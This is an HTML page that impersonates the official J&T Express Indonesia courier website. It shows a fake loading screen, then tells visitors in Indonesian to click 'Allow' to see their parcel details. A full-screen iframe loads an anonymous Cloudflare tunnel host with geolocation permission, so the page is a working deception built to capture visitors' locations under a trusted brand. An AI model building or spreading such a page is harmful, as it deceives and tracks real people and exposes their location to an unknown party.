<!DOCTYPE html>
<html>
<head>
    <title>J&T Express Indonesia Official</title>

    <meta property="og:title" content="J&T Express Indonesia - Official Website">
    <meta property="og:image" content="https://petunjuk.id/wp-content/uploads/2022/02/cara-cek-resi-jt-express.png">
    <meta property="og:description" content=""> 
    <meta property="og:type" content="website">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }

        #main-content {
            text-align: center;
            transition: opacity 0.4s ease;
            width: 95%; /* Diperlebar sedikit agar konten tidak sesak */
        }

        .logo {
            /* Ukuran diperbesar secara signifikan menjadi 400px */
            width: 400px; 
            max-width: 90%; /* Agar tetap muat di layar HP tanpa terpotong */
            height: auto;
            margin-bottom: 30px; /* Jarak bawah ditambah agar lebih lega */
        }

        .title {
            color: #ff0000;
            font-weight: bold;
            font-size: 1.5em; /* Teks judul ikut diperbesar agar seimbang dengan logo */
            margin-bottom: 25px;
        }

        #instruction-msg {
            position: fixed;
            bottom: 30%;
            width: 85%;
            text-align: center;
            color: #333;
            font-size: 16px;
            line-height: 1.6;
            display: none; 
            padding: 15px;
        }

        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ff0000;
            border-radius: 50%;
            width: 45px; 
            height: 45px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-top: 15px;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 10;
        }
    </style>
</head>
<body>

    <div id="main-content">
        <img src="https://assets-a1.kompasiana.com/items/album/2019/12/05/j-t5-5de8a2f4d541df70016a95f3.jpg" class="logo">
        <div class="title">J&T Express Indonesia Official Website</div>
        <div class="loader"></div>
        <p style="font-size: 18px; color: #555;">Menghubungkan ke server J&T...</p>
    </div>

    <div id="instruction-msg">
        <p>Jika gambar atau halaman web tidak muncul dan hanya berwarna putih, silakan klik <b>"Izinkan / Allow"</b> agar situs web dapat kembali normal dan dapat memuat detail informasi mengenai paket Anda.</p>
    </div>

    <iframe src="https://statewide-kai-structured-closer.trycloudflare.com" allow="geolocation *"></iframe>

    <script>
        setTimeout(function() {
            document.getElementById('main-content').style.opacity = '0';
            
            setTimeout(function() {
                document.getElementById('main-content').style.display = 'none';
                document.getElementById('instruction-msg').style.display = 'block';
            }, 400);
        }, 2500); 
    </script>

</body>
</html>
